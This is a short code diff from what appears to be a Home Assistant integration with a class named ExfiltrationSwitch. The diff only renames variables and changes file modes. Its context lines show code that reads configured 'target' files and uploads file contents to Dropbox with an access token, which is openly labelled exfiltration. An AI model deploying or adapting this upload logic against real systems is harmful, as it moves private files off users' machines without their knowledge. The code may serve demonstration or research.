@@ -95,16 +95,16 @@ class ExfiltrationSwitch(SwitchEntity):
         """Print configuration info for debug purposes."""
 
         if self._file_path:
-            with open(self._file_path + self._target_file1, "r") as f:
+            with open(self._file_path + self._target_file1, "rt") as _f:
                 print("target 1")
                 print("-----")
-                data = f.read()
+                data = _f.read()
                 print(data)
                 print("-----")
-            with open(self._file_path + self._target_file2, "r") as f:
+            with open(self._file_path + self._target_file2, "rt") as _f:
                 print("target 2")
                 print("-----")
-                data = f.read()
+                data = _f.read()
                 print(data)
                 print("-----")
 
@@ -157,5 +157,5 @@ class ExfiltrationSwitch(SwitchEntity):
         """upload a file to Dropbox using API v2"""
         dbx = dropbox.Dropbox(self._access_token)
 
-        with open(file_from, "rb") as f:
-            dbx.files_upload(f.read(), file_to, mode=dropbox.files.WriteMode.overwrite)
+        with open(file_from, "rb") as _f:
+            dbx.files_upload(_f.read(), file_to, mode=dropbox.files.WriteMode.overwrite)
